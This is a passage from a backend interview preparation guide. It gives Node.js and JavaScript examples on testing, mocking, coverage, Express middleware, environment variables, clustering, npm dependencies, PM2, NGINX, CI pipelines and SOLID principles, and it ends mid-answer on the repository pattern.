3. REFACTOR: Clean up the code while keeping tests green
```

**Example:**

```js
// Step 1: RED — write failing test first
describe('UserService.register', () => {
  it('throws if email already exists', async () => {
    await UserService.register({ email: 'a@b.com', password: '123' });

    await expect(
      UserService.register({ email: 'a@b.com', password: '456' })
    ).rejects.toThrow('Email already registered'); // FAILS — function doesn't exist yet
  });
});

// Step 2: GREEN — minimal implementation to pass
const UserService = {
  async register({ email, password }) {
    const existing = await User.findByEmail(email);
    if (existing) throw new Error('Email already registered'); // ← test passes now ✅
    return User.create({ email, password: await bcrypt.hash(password, 10) });
  }
};

// Step 3: REFACTOR — improve code quality, add validation, etc.
```

**Benefits:**
- Forces you to think about the API design before coding.
- Ensures every feature has test coverage.
- Catches regressions immediately.
- Produces more modular, testable code.

**Drawbacks:**
- Slower initial development — writing tests takes time.
- Hard for exploratory/prototyping work.
- Tests can become a crutch — high coverage ≠ good tests.
- Harder for UI and integration-heavy code.

> 📖 Reference: [TDD — Martin Fowler](https://martinfowler.com/bliki/TestDrivenDevelopment.html)

---

**Q40. What is mocking? When and why would you mock a database or external service in tests?**

**Answer:**

**Mocking** replaces a real dependency with a fake version that you control — it returns predetermined values and records how it was called.

**Why mock:**
- Tests run faster — no real DB/network calls.
- Tests are deterministic — no flakiness from external services.
- Tests work offline/in CI without infrastructure.
- You can simulate error scenarios that are hard to reproduce (DB down, API timeout).

```js
// ✅ Mocking a database call with Jest
const UserRepository = require('./userRepository');
const UserService    = require('./userService');

jest.mock('./userRepository'); // all methods are auto-mocked

describe('UserService.getUser', () => {
  afterEach(() => jest.clearAllMocks());

  it('returns the user when found', async () => {
    // Arrange: tell the mock what to return
    UserRepository.findById.mockResolvedValue({
      id: 1, name: 'Alice', email: 'alice@example.com'
    });

    // Act
    const user = await UserService.getUser(1);

    // Assert
    expect(user.name).toBe('Alice');
    expect(UserRepository.findById).toHaveBeenCalledWith(1); // verify it was called
    expect(UserRepository.findById).toHaveBeenCalledTimes(1);
  });

  it('throws when user not found', async () => {
    UserRepository.findById.mockResolvedValue(null); // simulate not found

    await expect(UserService.getUser(999)).rejects.toThrow('User not found');
  });

  it('handles DB errors gracefully', async () => {
    UserRepository.findById.mockRejectedValue(new Error('DB connection lost'));

    await expect(UserService.getUser(1)).rejects.toThrow('DB connection lost');
  });
});
```

**When NOT to mock:** Integration tests are meant to test real interactions — don't mock the DB in integration tests, use a test database instead.

> 📖 Reference: [Mocking — Jest Docs](https://jestjs.io/docs/mock-functions)

---

**Q41. What is code coverage? Is 100% code coverage a good goal?**

**Answer:**

**Code coverage** measures what percentage of your source code is executed during tests.

```bash
# Jest coverage report
jest --coverage

# Output:
# File             | % Stmts | % Branch | % Funcs | % Lines
# userService.js   |   87.5  |   75.0   |  100.0  |  87.5
# orderService.js  |   100   |   100    |  100    |  100
```

**Types of coverage:**
- **Statement coverage:** Was each statement executed?
- **Branch coverage:** Was each if/else branch taken?
- **Function coverage:** Was each function called?
- **Line coverage:** Was each line executed?

**Is 100% a good goal? No.**

```js
// ✅ This has 100% coverage — but tests are meaningless
function add(a, b) {
  return a + b;
}

test('add works', () => {
  const result = add(2, 3);
  expect(result).toBeDefined(); // covers the line, but doesn't verify correctness!
});

// ✅ Better: aim for meaningful tests on critical paths
// 80% coverage with meaningful tests > 100% coverage with shallow tests

// Not worth testing:
// - Framework boilerplate
// - Configuration files
// - Simple getters/setters
// - Third-party code

// Worth testing at high coverage:
// - Business logic (payment calculation, discount rules)
// - Auth and permission logic
// - Data transformation functions
// - Error handling paths
```

**Good rule of thumb:** 70–80% overall coverage with 95%+ on critical business logic.

> 📖 Reference: [Code Coverage — Martin Fowler](https://martinfowler.com/bliki/TestCoverage.html)

---

**Q42. What is a test fixture? What is setup and teardown in tests?**

**Answer:**

A **test fixture** is the fixed state or context that tests need to run — pre-seeded database records, mock objects, configuration, test files.

**Setup and teardown** are lifecycle hooks that run before/after tests to prepare and clean up fixtures.

```js
// Jest lifecycle hooks
describe('OrderService', () => {

  // ── Setup ──────────────────────────────────────────────────────────────

  beforeAll(async () => {
    // Runs ONCE before all tests in this describe block
    await db.migrate.latest();            // run DB migrations
    await db.seed.run();                  // seed reference data (products, categories)
    logger.silent = true;                 // suppress logs during tests
  });

  beforeEach(async () => {
    // Runs before EACH test
    testUser = await User.create({
      name: 'Test User',
      email: `test-${Date.now()}@example.com`,  // unique per test
      password: await bcrypt.hash('password', 10)
    });
  });

  // ── Tests ──────────────────────────────────────────────────────────────

  it('creates an order for a valid user', async () => {
    const order = await OrderService.create({
      userId: testUser.id,
      productId: 1,
      quantity: 2
    });
    expect(order.id).toBeDefined();
    expect(order.userId).toBe(testUser.id);
  });

  it('throws for out-of-stock product', async () => {
    await db('products').where({ id: 1 }).update({ stock: 0 }); // fixture tweak
    await expect(
      OrderService.create({ userId: testUser.id, productId: 1, quantity: 1 })
    ).rejects.toThrow('Out of stock');
  });

  // ── Teardown ───────────────────────────────────────────────────────────

  afterEach(async () => {
    // Runs after EACH test — clean up created data
    await db('orders').where({ user_id: testUser.id }).delete();
    await User.delete(testUser.id);
  });

  afterAll(async () => {
    // Runs ONCE after all tests
    await db.destroy(); // close DB connection
  });
});
```

> 📖 Reference: [Test Fixtures — Wikipedia](https://en.wikipedia.org/wiki/Test_fixture)

---

## 7. Node.js / Backend Runtime Concepts

---

**Q43. What is the difference between `require()` (CommonJS) and `import` (ES Modules)?**

**Answer:**

| | CommonJS (`require`) | ES Modules (`import`) |
|--|---------------------|----------------------|
| Syntax | `const x = require('x')` | `import x from 'x'` |
| Loading | Synchronous | Asynchronous |
| When resolved | Runtime | Parse time (static) |
| Tree shaking | ❌ No | ✅ Yes (bundlers can remove unused code) |
| `this` in module | `module.exports` | `undefined` |
| Default in Node.js | Yes (`.js` files) | Requires `"type": "module"` in package.json or `.mjs` extension |

```js
// ── CommonJS ─────────────────────────────────────────────────────────
// math.js
const add = (a, b) => a + b;
module.exports = { add };
// or: module.exports.add = add;

// main.js
const { add } = require('./math');       // synchronous, resolved at runtime
const path = require('path');             // works — require() can be inside functions

if (someCondition) {
  const utils = require('./utils');       // ✅ dynamic conditional require works
}

// ── ES Modules ───────────────────────────────────────────────────────
// math.mjs
export const add = (a, b) => a + b;
export default function multiply(a, b) { return a * b; }

// main.mjs
import { add } from './math.mjs';         // static — resolved at parse time
import multiply from './math.mjs';        // default import

// Dynamic import (lazy loading) — returns a Promise
const { add } = await import('./math.mjs'); // ✅ dynamic import in ESM
```

**When to use which:**
- New Node.js projects: prefer ES Modules (modern standard).
- Libraries consumed by both: ship CommonJS for compatibility.
- Most existing Node.js projects: CommonJS (legacy).

> 📖 Reference: [CommonJS vs ES Modules — Node.js Docs](https://nodejs.org/api/esm.html)

---

**Q44. What is middleware in Express? How does the middleware chain work?**

**Answer:**

Middleware is a function with the signature `(req, res, next)` that runs between the request arriving and the response being sent. Each middleware can modify `req`/`res` and either end the cycle or call `next()` to pass to the next middleware.

```
Request → [logger] → [auth] → [validate] → [routeHandler] → Response
              ↓         ↓          ↓               ↓
            next()   next()     next()           res.json()
```

```js
const express = require('express');
const app = express();

// ── Global middleware (runs on every request) ──────────────────────
app.use(express.json());   // parse JSON body
app.use(express.urlencoded({ extended: true }));

// Custom request logger
app.use((req, res, next) => {
  req.startTime = Date.now();
  console.log(`→ ${req.method} ${req.url}`);
  res.on('finish', () => {
    console.log(`← ${res.statusCode} (${Date.now() - req.startTime}ms)`);
  });
  next(); // ← MUST call next() or the chain stops here
});

// ── Auth middleware ────────────────────────────────────────────────
const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' }); // chain ends here
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET); // attach to req
    next(); // pass to next middleware
  } catch {
    res.status(401).json({ error: 'Invalid token' }); // chain ends here
  }
};

// ── Route-level middleware ─────────────────────────────────────────
app.get('/profile', requireAuth, async (req, res) => {
  // req.user is available here because requireAuth set it
  const profile = await User.findById(req.user.userId);
  res.json(profile);
});

// ── Error middleware (4 params — must be last) ─────────────────────
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Internal server error' });
});
```

> 📖 Reference: [Express Middleware — Express Docs](https://expressjs.com/en/guide/using-middleware.html)

---

**Q45. What is the purpose of `process.env`? How do you manage environment configs?**

**Answer:**

`process.env` is a Node.js global object containing all environment variables — values injected from the OS or `.env` files at runtime, not hardcoded in source code.

```js
// ❌ BAD: hardcoded config
const db = new Database('postgres://admin:supersecret@prod-db.company.com/myapp');
const jwtSecret = 'mysecretkey123';

// ✅ GOOD: from environment
const db = new Database(process.env.DATABASE_URL);
const jwtSecret = process.env.JWT_SECRET;
```

**Managing env vars with dotenv:**

```bash
# .env (never commit this!)
DATABASE_URL=postgres://user:pass@localhost:5432/myapp
JWT_SECRET=dev-only-secret-change-in-prod
PORT=3000
LOG_LEVEL=debug
REDIS_URL=redis://localhost:6379
```

```js
// app.js — load .env at startup (before anything else)
require('dotenv').config();

// ✅ config/index.js — validate and export config once
const config = {
  port: parseInt(process.env.PORT) || 3000,
  db: {
    url: process.env.DATABASE_URL,
    poolSize: parseInt(process.env.DB_POOL_SIZE) || 10,
  },
  jwt: {
    secret: process.env.JWT_SECRET,
    expiresIn: process.env.JWT_EXPIRES_IN || '15m',
  }
};

// Validate required env vars at startup
const required = ['DATABASE_URL', 'JWT_SECRET'];
const missing = required.filter(key => !process.env[key]);
if (missing.length > 0) {
  console.error('Missing required env vars:', missing.join(', '));
  process.exit(1); // fail fast — don't start with missing config
}

module.exports = config;
```

**Files to always have:**
- `.env` — actual values, **never committed**
- `.env.example` — template with placeholder values, **committed**
- `.gitignore` — must include `.env`

> 📖 Reference: [Environment Variables — 12 Factor App](https://12factor.net/config)

---

**Q46. What is a memory leak in a backend application? How do you detect and prevent one?**

**Answer:**

A **memory leak** occurs when a program allocates memory but never releases it, causing memory usage to grow continuously until the process crashes or becomes extremely slow.

**Common causes in Node.js:**

```js
// ❌ Cause 1: Global variable accumulation
const cache = {}; // global
app.get('/data', async (req, res) => {
  const key = req.query.id;
  cache[key] = await fetchExpensiveData(key); // never cleaned up!
  // After 1 million unique requests: 1 million entries in memory
  res.json(cache[key]);
});
// ✅ Fix: Use a bounded cache (LRU cache library or Redis with TTL)
const LRU = require('lru-cache');
const cache = new LRU({ max: 1000, ttl: 1000 * 60 * 5 }); // max 1000 items, 5min TTL

// ❌ Cause 2: Event listener not removed
class DataService extends EventEmitter {
  startPolling() {
    setInterval(() => {
      this.emit('data', fetchData());
    }, 1000);
  }
}

const service = new DataService();
app.get('/subscribe', (req, res) => {
  service.on('data', (data) => res.write(data)); // listener added on every request!
  // Listener is never removed → memory grows with each request
});
// ✅ Fix: Remove listener when the request ends
app.get('/subscribe', (req, res) => {
  const handler = (data) => res.write(JSON.stringify(data));
  service.on('data', handler);
  req.on('close', () => service.off('data', handler)); // cleanup!
});

// ❌ Cause 3: Forgotten timers/intervals
function startTask() {
  setInterval(async () => {
    await processQueue();
  }, 5000);
  // Interval keeps running even after the object is "destroyed"
}
// ✅ Fix: Keep reference and clear when done
const interval = setInterval(...);
process.on('SIGTERM', () => clearInterval(interval));
```

**Detection:**

```bash
# Monitor memory usage over time
node --inspect app.js    # Open Chrome DevTools → Memory tab → heap snapshots

# Or use clinic.js
npx clinic heapprofiler -- node app.js
```

> 📖 Reference: [Memory Leaks in Node.js — Sematext](https://sematext.com/blog/nodejs-memory-leaks/)

---

**Q47. What is clustering in Node.js? How does it relate to multi-core utilization?**

**Answer:**

Node.js runs on a **single thread** by default — it uses only 1 CPU core. On a modern server with 16 cores, 15 cores sit idle. Clustering solves this by spawning multiple worker processes (one per core), each running its own Event Loop.

```js
// cluster.js — master/worker pattern
const cluster = require('cluster');
const os      = require('os');
const app     = require('./app');

if (cluster.isMaster) {
  const numCPUs = os.cpus().length; // e.g., 8 on an 8-core server
  console.log(`Master ${process.pid} starting ${numCPUs} workers`);

  // Fork one worker per CPU core
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // Restart crashed workers automatically
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });

} else {
  // Each worker runs the Express server on the same port
  // The OS distributes incoming connections across workers
  app.listen(3000, () => {
    console.log(`Worker ${process.pid} started on port 3000`);
  });
}

// Result: 8 Node.js processes sharing port 3000
// 8x throughput for CPU-bound work (I/O-bound improves less due to async)
```

**Modern alternative: PM2 (simpler)**

```bash
# PM2 handles clustering automatically
pm2 start app.js -i max   # -i max = one process per CPU core
pm2 start app.js -i 4     # exactly 4 processes
pm2 monit                  # monitor all instances
```

**Important:** Workers don't share memory — use Redis for shared state (sessions, caches).

> 📖 Reference: [Node.js Cluster Module — Node.js Docs](https://nodejs.org/api/cluster.html)

---

## 8. Package Management & Dependency Handling

---

**Q48. What is `package.json`? What is the difference between `dependencies` and `devDependencies`?**

**Answer:**

`package.json` is the manifest file for a Node.js project — it defines metadata (name, version, description), scripts, and lists all dependencies.

```json
{
  "name": "my-api",
  "version": "1.2.0",
  "description": "REST API for my app",
  "main": "src/index.js",
  "scripts": {
    "start":     "node src/index.js",
    "dev":       "nodemon src/index.js",
    "test":      "jest --coverage",
    "build":     "tsc",
    "lint":      "eslint src/"
  },
  "dependencies": {
    "express":   "^4.18.2",
    "jsonwebtoken": "^9.0.0",
    "bcryptjs":  "^2.4.3",
    "pg":        "^8.11.0"
  },
  "devDependencies": {
    "jest":      "^29.0.0",
    "nodemon":   "^3.0.0",
    "eslint":    "^8.0.0",
    "typescript": "^5.0.0",
    "supertest": "^6.0.0"
  }
}
```

| | `dependencies` | `devDependencies` |
|--|---------------|------------------|
| Purpose | Required at **runtime** in production | Only needed during **development and testing** |
| Installed with | `npm install` | `npm install` (locally), skipped with `npm install --production` |
| Examples | express, pg, bcryptjs, axios | jest, nodemon, eslint, typescript, @types/* |

**Production deployments** typically run `npm ci --production` to skip devDependencies, reducing the Docker image size.

> 📖 Reference: [package.json — npm Docs](https://docs.npmjs.com/cli/v10/configuring-npm/package-json)

---

**Q49. What is semantic versioning (semver)? What do `^` and `~` mean in version constraints?**

**Answer:**

**Semantic Versioning (semver):** Version numbers follow the format `MAJOR.MINOR.PATCH`:

| Part | When to increment | Example |
|------|------------------|---------|
| MAJOR | Breaking change (incompatible API) | `1.0.0` → `2.0.0` |
| MINOR | New features (backward compatible) | `1.0.0` → `1.1.0` |
| PATCH | Bug fixes (backward compatible) | `1.0.0` → `1.0.1` |

**`^` and `~` in `package.json`:**

```json
{
  "dependencies": {
    "express": "^4.18.2",   // ^ = compatible with: >=4.18.2 <5.0.0
    "lodash":  "~4.17.21",  // ~ = approximately: >=4.17.21 <4.18.0
    "axios":   "1.6.0"      // exact version — no auto-updates
  }
}
```

```
"^4.18.2" — caret: allows MINOR and PATCH updates
  Accepts: 4.18.3 ✅, 4.19.0 ✅, 4.99.0 ✅
  Rejects:  5.0.0 ❌ (major change = breaking)

"~4.17.21" — tilde: allows only PATCH updates
  Accepts: 4.17.22 ✅, 4.17.99 ✅
  Rejects:  4.18.0 ❌ (minor bump = not allowed)

"1.6.0" — exact pin: only this exact version
  Accepts: 1.6.0 only ✅
  Most restrictive — use for critical dependencies
```

**Best practice for production:** Use `package-lock.json` (which pins exact versions regardless of `^/~`) and run `npm ci` instead of `npm install` for reproducible builds.

> 📖 Reference: [Semver — semver.org](https://semver.org/)

---

**Q50. What is a `package-lock.json` / `yarn.lock` file? Why should it be committed to Git?**

**Answer:**

`package-lock.json` records the **exact version** of every installed package (including nested dependencies of dependencies) at the time you ran `npm install`. It makes installs fully reproducible.

**Why it matters:**

```json
// package.json declares:
"dependencies": { "express": "^4.18.2" }

// Without package-lock.json:
// Dev installs today:   express 4.18.2 ✅
// CI installs next week: express 4.19.1 (new minor) ← different version!
// Production installs in 3 months: express 4.21.0 ← yet another version!
// → "works on my machine" syndrome

// With package-lock.json committed:
// Everyone, everywhere installs EXACTLY express 4.18.2
// Fully reproducible ✅
```

```bash
# ✅ Use npm ci in CI/CD pipelines
npm ci  # installs EXACTLY what's in package-lock.json
        # fails if package.json and package-lock.json are out of sync
        # much faster than npm install

# vs:
npm install  # may update versions within ^ ranges
```

**Rule:** Always commit `package-lock.json` (or `yarn.lock`). Never commit `node_modules/`.

> 📖 Reference: [package-lock.json — npm Docs](https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json)

---

**Q51. What is a dependency vulnerability? How do you audit and fix them?**

**Answer:**

A dependency vulnerability is a security flaw discovered in a package your project depends on (directly or transitively). Attackers can exploit these to run arbitrary code, steal data, or take over the server.

**Real example:** Log4Shell (CVE-2021-44228) — a critical vulnerability in `log4j` (Java) allowed remote code execution. Millions of Java apps were affected.

```bash
# ✅ Audit your dependencies
npm audit
# Output:
# found 3 vulnerabilities (1 moderate, 2 high)
#
# high   Remote Code Execution in lodash
# Package lodash
# Patched in >=4.17.21
# Dependency of: express > body-parser > qs > lodash
# Fix: npm audit fix

npm audit --json  # machine-readable output for CI

# ✅ Auto-fix non-breaking vulnerabilities
npm audit fix

# ✅ Force-fix (may cause breaking changes — review carefully)
npm audit fix --force

# ✅ Update a specific package
npm install lodash@latest
```

**In CI pipeline:**

```yaml
# GitHub Actions example
- name: Security audit
  run: npm audit --audit-level=high
  # Fails the build if any HIGH or CRITICAL vulnerabilities found
```

**Tools beyond npm audit:**
- **Snyk:** Deeper analysis, patches, monitoring.
- **Dependabot:** GitHub bot that auto-creates PRs to update vulnerable deps.
- **Socket.dev:** Detects malicious packages, not just vulnerable ones.

> 📖 Reference: [npm audit — npm Docs](https://docs.npmjs.com/cli/v10/commands/npm-audit)

---

## 9. Basic DevOps & Deployment

---

**Q52. What is the difference between development, staging, and production environments?**

**Answer:**

| Environment | Purpose | Data | Who uses it |
|-------------|---------|------|-------------|
| **Development** | Local coding and debugging | Fake/mocked data | Individual developer |
| **Staging** | Pre-production testing mirror | Anonymized copy of prod | QA, developers, PMs |
| **Production** | Live system serving real users | Real user data | End users |

```
Code flow:
Developer → dev → staging → production
             ↑        ↑          ↑
           Local    QA/Test     Live users
```

```bash
# ── .env.development ─────────────────────
DATABASE_URL=postgres://localhost:5432/myapp_dev
LOG_LEVEL=debug
STRIPE_SECRET_KEY=sk_test_xxx    # Stripe test mode
EMAIL_DRIVER=log                  # Emails printed to console, not sent
CACHE_TTL=0                       # Disable cache for debugging

# ── .env.staging ─────────────────────────
DATABASE_URL=postgres://staging-db.internal:5432/myapp_staging
LOG_LEVEL=info
STRIPE_SECRET_KEY=sk_test_xxx    # Still test mode in staging
EMAIL_DRIVER=smtp                 # Real emails but to test accounts

# ── .env.production ───────────────────────
DATABASE_URL=postgres://prod-db.internal:5432/myapp_prod
LOG_LEVEL=warn
STRIPE_SECRET_KEY=sk_live_xxx    # Real money!
EMAIL_DRIVER=smtp                 # Real emails to real users
```

**Why staging matters:** It's where you catch bugs that only appear with real data volumes, infrastructure, and integrations — before they hit real users.

> 📖 Reference: [Deployment Environments — Atlassian](https://www.atlassian.com/continuous-delivery/software-testing/deployment-environment)

---

**Q53. What is a reverse proxy? Name a common one and explain why it's used.**

**Answer:**

A **reverse proxy** sits in front of backend servers and forwards client requests to the appropriate backend. Clients talk to the proxy — they never connect directly to the origin server.

```
Without reverse proxy:
Client → :3000 (Node.js app)

With NGINX reverse proxy:
Client → :80/:443 (NGINX) → :3000 (Node.js app)
                          → :3001 (another service)
                          → static files (served directly by NGINX)
```

**Common reverse proxies:** NGINX, Caddy, HAProxy, AWS ALB/CloudFront.

**Why use one:**

```nginx
# NGINX config example
server {
    listen 80;
    server_name api.myapp.com;

    # 1. SSL termination — NGINX handles HTTPS, Node gets plain HTTP
    listen 443 ssl;
    ssl_certificate     /etc/ssl/cert.pem;
    ssl_certificate_key /etc/ssl/key.pem;

    # 2. Static file serving — NGINX is much faster than Node.js for static files
    location /static/ {
        root /var/www;
        expires 30d;
    }

    # 3. Load balancing across multiple Node.js instances
    upstream nodejs_backend {
        least_conn;
        server 127.0.0.1:3000;
        server 127.0.0.1:3001;
        server 127.0.0.1:3002;
    }

    # 4. Forward API requests to Node.js
    location /api/ {
        proxy_pass http://nodejs_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;     # pass real client IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # 5. Rate limiting
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    location /api/auth/ {
        limit_req zone=api burst=5;
        proxy_pass http://nodejs_backend;
    }
}
```

> 📖 Reference: [Reverse Proxy — NGINX Docs](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/)

---

**Q54. What is a process manager (e.g., PM2)? Why do you need one for a Node.js app?**

**Answer:**

A **process manager** keeps your application running, restarts it on crashes, manages logs, and allows zero-downtime reloads.

**Without a process manager:**

```bash
node app.js
# App crashes → server is down until someone manually restarts it
# Server restarts → app is gone
# No log management
# Using only 1 of 8 CPU cores
```

**With PM2:**

```bash
# Install PM2
npm install -g pm2

# Start app (auto-restarts on crash)
pm2 start app.js --name "my-api"

# Use all CPU cores (cluster mode)
pm2 start app.js --name "my-api" -i max

# Auto-restart on server reboot
pm2 startup
pm2 save

# Monitor all processes
pm2 monit
pm2 status

# Zero-downtime reload (for deployments)
pm2 reload my-api

# Logs
pm2 logs my-api
pm2 logs my-api --lines 200
```

```js
// ecosystem.config.js — production configuration
module.exports = {
  apps: [{
    name:         'my-api',
    script:       'src/index.js',
    instances:    'max',            // one per CPU core
    exec_mode:    'cluster',
    watch:        false,
    max_memory_restart: '500M',     // restart if memory exceeds 500MB (leak guard)
    env: {
      NODE_ENV: 'development',
      PORT: 3000
    },
    env_production: {
      NODE_ENV: 'production',
      PORT: 80
    },
    log_date_format: 'YYYY-MM-DD HH:mm:ss',
    error_file: 'logs/error.log',
    out_file:   'logs/out.log'
  }]
};
```

> 📖 Reference: [PM2 Docs](https://pm2.keymetrics.io/docs/usage/quick-start/)

---

**Q55. What is a `.env` file? What are best practices for managing secrets?**

**Answer:**

A `.env` file stores environment-specific configuration as `KEY=VALUE` pairs, loaded at runtime by the `dotenv` library. It keeps secrets out of source code.

```bash
# .env — never commit this file!
NODE_ENV=development
PORT=3000
DATABASE_URL=postgres://user:password@localhost:5432/mydb
JWT_SECRET=dev-only-not-secure-please-change
STRIPE_SECRET_KEY=sk_test_...
SENDGRID_API_KEY=SG.xxx...
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=xxx...
REDIS_URL=redis://localhost:6379
```

**Best practices:**

```bash
# .env.example — COMMIT THIS (no real values, just keys)
NODE_ENV=
PORT=3000
DATABASE_URL=
JWT_SECRET=
STRIPE_SECRET_KEY=
SENDGRID_API_KEY=
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
REDIS_URL=

# .gitignore — ALWAYS include
.env
.env.local
.env.*.local
```

```js
// ✅ Validate at startup — fail fast if missing
const requiredEnvVars = [
  'DATABASE_URL', 'JWT_SECRET', 'STRIPE_SECRET_KEY'
];
const missing = requiredEnvVars.filter(v => !process.env[v]);
if (missing.length) {
  throw new Error(`Missing env vars: ${missing.join(', ')}`);
}
```

**For production — use a secrets manager, not .env files:**
- **AWS Secrets Manager / Parameter Store**
- **HashiCorp Vault**
- **GCP Secret Manager / Azure Key Vault**
- **Kubernetes Secrets**

These provide rotation, audit logs, and fine-grained access control.

> 📖 Reference: [dotenv — GitHub](https://github.com/motdotla/dotenv)

---

**Q56. What is a health check endpoint? Why do deployed services expose one?**

**Answer:**

A health check endpoint is a lightweight API route (usually `GET /health` or `GET /healthz`) that returns the service's operational status, allowing load balancers, Kubernetes, and monitoring systems to know if the service is ready to handle traffic.

```js
// ✅ Basic health check
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

// ✅ Deep health check — verifies all critical dependencies
app.get('/health', async (req, res) => {
  const checks = {
    status:    'ok',
    timestamp: new Date().toISOString(),
    uptime:    process.uptime(),
    version:   process.env.APP_VERSION || '1.0.0',
    checks: {}
  };

  // Check database connectivity
  try {
    await db.query('SELECT 1');
    checks.checks.database = { status: 'ok' };
  } catch (err) {
    checks.checks.database = { status: 'error', message: err.message };
    checks.status = 'degraded';
  }

  // Check Redis connectivity
  try {
    await redis.ping();
    checks.checks.redis = { status: 'ok' };
  } catch (err) {
    checks.checks.redis = { status: 'error', message: err.message };
    checks.status = 'degraded';
  }

  const httpStatus = checks.status === 'ok' ? 200 : 503;
  res.status(httpStatus).json(checks);
});

// Response:
// {
//   "status": "ok",
//   "timestamp": "2024-06-01T12:00:00.000Z",
//   "uptime": 3600,
//   "checks": {
//     "database": { "status": "ok" },
//     "redis":    { "status": "ok" }
//   }
// }
```

**How it's used:**
- **Kubernetes:** `livenessProbe` and `readinessProbe` call this every 10s.
- **Load balancers:** Remove the instance from rotation if it returns 5xx.
- **Monitoring (Datadog, PagerDuty):** Alert on-call if health check fails.

> 📖 Reference: [Health Check API — Microsoft Patterns](https://learn.microsoft.com/en-us/azure/architecture/patterns/health-endpoint-monitoring)

---

**Q57. What is a build pipeline? What steps does a typical backend CI pipeline include?**

**Answer:**

A **CI (Continuous Integration) pipeline** is an automated series of steps that run every time code is pushed, ensuring quality before merging to main or deploying.

```yaml
# .github/workflows/ci.yml — GitHub Actions example
name: CI Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_DB: myapp_test
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
        ports: ['5432:5432']

    steps:
      # Step 1: Checkout code
      - uses: actions/checkout@v3

      # Step 2: Set up Node.js
      - uses: actions/setup-node@v3
        with:
          node-version: '20'
          cache: 'npm'

      # Step 3: Install dependencies (fast, reproducible)
      - run: npm ci

      # Step 4: Lint — enforce code style
      - run: npm run lint

      # Step 5: Type check (if TypeScript)
      - run: npm run typecheck

      # Step 6: Run unit + integration tests with coverage
      - run: npm test -- --coverage
        env:
          DATABASE_URL: postgres://test:test@localhost:5432/myapp_test
          JWT_SECRET: test-secret

      # Step 7: Security audit — fail on HIGH vulnerabilities
      - run: npm audit --audit-level=high

      # Step 8: Build (compile TypeScript, bundle, etc.)
      - run: npm run build

      # Step 9: Build Docker image
      - run: docker build -t myapp:${{ github.sha }} .

      # Step 10: Push to registry (only on main branch)
      - if: github.ref == 'refs/heads/main'
        run: |
          docker tag myapp:${{ github.sha }} registry.io/myapp:latest
          docker push registry.io/myapp:latest

      # Step 11: Deploy to staging (only on main branch)
      - if: github.ref == 'refs/heads/main'
        run: ./scripts/deploy-staging.sh
```

**Pipeline stages summary:**
1. Install → 2. Lint → 3. Type Check → 4. Test → 5. Security Audit → 6. Build → 7. Docker Build → 8. Push → 9. Deploy

> 📖 Reference: [CI/CD — Atlassian](https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment)

---

## 10. Code Quality & Design Patterns

---

**Q58. What are the SOLID principles? Give a one-line explanation of each.**

**Answer:**

SOLID is a set of 5 design principles for writing maintainable, extensible object-oriented code.

| Letter | Principle | One-Line | Backend Example |
|--------|-----------|----------|----------------|
| **S** | Single Responsibility | A class/function should do ONE thing | `UserService` only handles user logic, not email sending |
| **O** | Open/Closed | Open for extension, closed for modification | Add new payment method by adding a class, not editing existing ones |
| **L** | Liskov Substitution | Subclasses must be usable wherever their parent is | `MockEmailService` can replace `SmtpEmailService` in tests |
| **I** | Interface Segregation | Don't force classes to implement methods they don't need | `IReadableCache` and `IWritableCache` instead of one huge `ICache` |
| **D** | Dependency Inversion | Depend on abstractions, not concrete implementations | `UserService` receives `IEmailService`, not `SmtpEmailService` directly |

**Code examples:**

```js
// ❌ Violates S: UserService does too much
class UserService {
  async createUser(data) {
    const user = await db.create(data);
    await sendWelcomeEmail(user.email); // ← should not be here
    await logToSlack(`New user: ${user.email}`); // ← should not be here
    return user;
  }
}

// ✅ Single Responsibility + Dependency Inversion
class UserService {
  constructor(userRepo, emailService, notificationService) { // injected
    this.userRepo = userRepo;
    this.emailService = emailService;
    this.notificationService = notificationService;
  }

  async createUser(data) {
    const user = await this.userRepo.create(data);
    await this.emailService.sendWelcome(user.email);
    await this.notificationService.notify(`New user: ${user.email}`);
    return user;
  }
}

// ❌ Violates O: adding a new payment method requires editing this class
class PaymentService {
  processPayment(method, amount) {
    if (method === 'stripe') { /* ... */ }
    else if (method === 'paypal') { /* ... */ } // edit every time!
    else if (method === 'crypto') { /* ... */ } // edit every time!
  }
}

// ✅ Open/Closed: add new payment method by adding a new class
class StripePaymentProvider {
  async charge(amount) { /* stripe logic */ }
}
class PaypalPaymentProvider {
  async charge(amount) { /* paypal logic */ }
}
class PaymentService {
  constructor(provider) { this.provider = provider; } // any provider works
  async processPayment(amount) { return this.provider.charge(amount); }
}
```

> 📖 Reference: [SOLID Principles — DigitalOcean](https://www.digitalocean.com/community/conceptual-articles/s-o-l-i-d-the-first-five-principles-of-object-oriented-design)

---

**Q59. What is the Repository Pattern? Why is it used in backend applications?**

**Answer:**

The **Repository Pattern** creates an abstraction layer between the business logic and the data layer. Instead of calling the database directly in service code, you call a repository that encapsulates all DB logic.

```js
// ❌ Without Repository Pattern — business logic tightly coupled to DB
class OrderService {
  async getUserOrders(userId) {
    // Business logic mixed with raw DB queries
    const orders = await db.query(
      `SELECT o.*, p.name as product_name
       FROM orders o
       JOIN products p ON o.product_id = p.id
       WHERE o.user_id = ? AND o.status != 'cancelled'
       ORDER BY o.created_at DESC`,
      [userId]
    );
    return orders;
  }
}
